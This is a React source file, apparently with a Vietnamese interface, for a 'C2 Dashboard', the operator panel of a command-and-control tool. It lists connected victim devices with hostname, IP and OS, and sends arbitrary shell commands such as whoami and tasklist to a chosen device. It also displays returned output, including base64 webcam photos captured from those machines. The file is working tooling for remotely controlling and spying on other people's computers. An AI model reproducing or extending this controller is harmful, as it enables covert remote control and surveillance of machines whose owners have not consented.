import { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import './App.css';

const API = 'http://localhost:8000';

function App() {
  const [token, setToken] = useState(localStorage.getItem('c2_token') || '');
  const [tab, setTab] = useState('devices');
  const [stats, setStats] = useState(null);
  const [devices, setDevices] = useState([]);
  const [commands, setCommands] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState('');
  const [cmdText, setCmdText] = useState('');
  const [cmdResult, setCmdResult] = useState('');
  const [loginErr, setLoginErr] = useState('');
  const [user, setUser] = useState(null);
  const [fullOutput, setFullOutput] = useState(null);

  const api = useCallback(() => axios.create({
    baseURL: API,
    headers: token ? { Authorization: `Bearer ${token}` } : {},
  }), [token]);

  const fetchStats = useCallback(async () => {
    try { const r = await api().get('/api/stats'); setStats(r.data); } catch (e) {}
  }, [api]);

  const fetchDevices = useCallback(async () => {
    try { const r = await api().get('/api/devices'); setDevices(r.data); } catch (e) {}
  }, [api]);

  const fetchCommands = useCallback(async () => {
    try {
      const params = selectedDevice ? { device_id: selectedDevice } : {};
      const r = await api().get('/api/commands', { params });
      setCommands(r.data);
    } catch (e) {}
  }, [api, selectedDevice]);

  useEffect(() => {
    if (!token) return;
    fetchStats(); fetchDevices(); fetchCommands();
    const iv = setInterval(() => { fetchStats(); fetchDevices(); fetchCommands(); }, 5000);
    return () => clearInterval(iv);
  }, [token, fetchStats, fetchDevices, fetchCommands]);

  const login = async (e) => {
    e.preventDefault();
    const fd = new FormData(e.target);
    try {
      const r = await axios.post(`${API}/auth/login`, {
        username: fd.get('username'),
        password: fd.get('password'),
      });
      const t = r.data.access_token;
      setToken(t);
      setUser({ username: r.data.username, role: r.data.role });
      localStorage.setItem('c2_token', t);
      setLoginErr('');
    } catch (err) {
      setLoginErr('Sai tai khoan hoac mat khau');
    }
  };

  const sendCommand = async () => {
    if (!selectedDevice || !cmdText) return;
    try {
      const r = await api().post('/api/commands', null, {
        params: { device_id: selectedDevice, command: cmdText }
      });
      setCmdResult(`✅ Da gui: ${r.data.command_id}`);
      setCmdText('');
      setTimeout(fetchCommands, 1000);
    } catch (e) {
      setCmdResult('❌ Loi: ' + (e.response?.data?.detail || e.message));
    }
  };

  const logout = () => {
    localStorage.removeItem('c2_token');
    setToken(''); setUser(null);
  };

  const deleteDevice = async (deviceId) => {
    if (!window.confirm(`Xoa thiet bi ${deviceId}?`)) return;
    try {
      await api().delete(`/api/devices/${deviceId}`);
      fetchDevices(); fetchStats();
    } catch (e) { alert('Loi xoa: ' + (e.response?.data?.detail || e.message)); }
  };

  if (!token) {
    return (
      <div className="login-page">
        <div className="login-box">
          <h1>🛡️ C2 Dashboard</h1>
          <form onSubmit={login}>
            <input name="username" placeholder="Username" defaultValue="admin" required />
            <input name="password" type="password" placeholder="Password" required />
            <button type="submit">Dang nhap</button>
          </form>
          {loginErr && <p className="err">{loginErr}</p>}
        </div>
      </div>
    );
  }

  return (
    <div className="app">
      <header>
        <h1>🛡️ C2 Dashboard</h1>
        <nav>
          <button className={tab === 'devices' ? 'active' : ''} onClick={() => setTab('devices')}>📡 Thiet bi</button>
          <button className={tab === 'commands' ? 'active' : ''} onClick={() => setTab('commands')}>💻 Lenh</button>
          <button className={tab === 'alerts' ? 'active' : ''} onClick={() => setTab('alerts')}>🔔 Canh bao</button>
        </nav>
        <div className="user-info">
          <span>{user?.username} ({user?.role})</span>
          <button onClick={logout} className="btn-logout">Dang xuat</button>
        </div>
      </header>

      {stats && (
        <div className="stats-bar">
          <div className="stat online"><span>{stats.devices_online}</span> Online</div>
          <div className="stat total"><span>{stats.devices_total}</span> Total</div>
          <div className="stat pending"><span>{stats.pending_commands}</span> Pending</div>
          <div className="stat alerts"><span>{stats.unread_alerts}</span> Alerts</div>
        </div>
      )}

      {tab === 'devices' && (
        <div className="panel">
          <h2>Danh sach thiet bi</h2>
          <table>
            <thead>
              <tr>
                <th>Device ID</th><th>Hostname</th><th>IP</th><th>OS</th><th>CPU</th><th>RAM</th><th>Status</th><th>Last Seen</th><th>Action</th>
              </tr>
            </thead>
            <tbody>
              {devices.map(d => {
                let meta = {};
                try { meta = typeof d.metadata === 'string' ? JSON.parse(d.metadata) : (d.metadata || {}); } catch (e) {}
                return (
                  <tr key={d.device_id} className={d.status === 'online' ? 'row-online' : 'row-offline'}>
                    <td><code>{d.device_id}</code></td>
                    <td>{d.hostname}</td>
                    <td>{d.ip_address}</td>
                    <td>{d.os_name} {d.os_version?.slice(0,15)}</td>
                    <td>{meta.cpu_percent ?? '?'}%</td>
                    <td>{meta.ram_percent ?? '?'}%</td>
                    <td><span className={`badge ${d.status}`}>{d.status}</span></td>
                    <td>{new Date(d.last_seen).toLocaleTimeString()}</td>
                    <td>
                      <button onClick={() => { setSelectedDevice(d.device_id); setTab('commands'); }}>💻</button>
                      <button onClick={() => deleteDevice(d.device_id)} style={{background:'#da3633',marginLeft:4}}>🗑️</button>
                    </td>
                  </tr>
                );
              })}
              {devices.length === 0 && <tr><td colSpan="9" className="empty">No devices connected</td></tr>}
            </tbody>
          </table>
        </div>
      )}

      {tab === 'commands' && (
        <div className="panel">
          <h2>Gui lenh</h2>
          <div className="cmd-send">
            <select value={selectedDevice} onChange={e => setSelectedDevice(e.target.value)}>
              <option value="">-- Chon thiet bi --</option>
              {devices.filter(d => d.status === 'online').map(d => (
                <option key={d.device_id} value={d.device_id}>{d.hostname} ({d.device_id})</option>
              ))}
            </select>
            <input
              value={cmdText}
              onChange={e => setCmdText(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && sendCommand()}
              placeholder="ipconfig / whoami / dir / tasklist..."
            />
            <button onClick={sendCommand} disabled={!selectedDevice || !cmdText}>🚀 Send</button>
          </div>
          {cmdResult && <p className="cmd-result">{cmdResult}</p>}

          <h2>Lich su lenh</h2>
          <table>
            <thead>
              <tr><th>ID</th><th>Device</th><th>Command</th><th>Status</th><th>Output</th><th>Exit</th><th>Time</th></tr>
            </thead>
            <tbody>
              {commands.map(c => (
                <tr key={c.command_id}>
                  <td>{c.command_id}</td>
                  <td><code>{c.device_id?.slice(-12)}</code></td>
                  <td className="cmd-cell">{c.command_text}</td>
                  <td><span className={`badge ${c.status}`}>{c.status}</span></td>
                  <td className="output-cell" onClick={() => setFullOutput(c.output)} title="Click de xem full">
                    {c.output?.indexOf('[IMG]') !== -1 ? (
                      <span className="webcam-thumb" onClick={e => { e.stopPropagation(); setFullOutput(c.output); }}>
                        📸 View Photo
                      </span>
                    ) : (
                      <>{c.output?.slice(0, 60)}{c.output?.length > 60 ? '...' : ''}</>
                    )}
                  </td>
                  <td>{c.exit_code !== null ? c.exit_code : '-'}</td>
                  <td>{new Date(c.created_at).toLocaleTimeString()}</td>
                </tr>
              ))}
              {commands.length === 0 && <tr><td colSpan="7" className="empty">No commands yet</td></tr>}
            </tbody>
          </table>
        </div>
      )}

      {tab === 'alerts' && (
        <div className="panel">
          <h2>Canh bao</h2>
          <p className="empty">No alerts. Everything is running smoothly.</p>
        </div>
      )}

      {/* Full Output Modal */}
      {fullOutput !== null && (
        <div className="output-overlay" onClick={() => setFullOutput(null)}>
          <div className="output-modal" onClick={e => e.stopPropagation()}>
            <div className="output-modal-header">
              <span>📄 Output</span>
              <button onClick={() => setFullOutput(null)}>✕</button>
            </div>
            <div className="output-modal-body">
              {fullOutput && (() => {
                const imgMatch = fullOutput.match(/\[IMG\](.*?)\[\/IMG\]/);
                if (imgMatch) {
                  const b64 = imgMatch[1];
                  const text = fullOutput.replace(/\[IMG\].*?\[\/IMG\]/, '').trim();
                  return (
                    <>
                      <div className="webcam-container">
                        <img src={`data:image/jpeg;base64,${b64}`} alt="Webcam" className="webcam-img" />
                      </div>
                      <pre>{text || '(no additional output)'}</pre>
                    </>
                  );
                }
                return <pre>{fullOutput}</pre>;
              })()}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
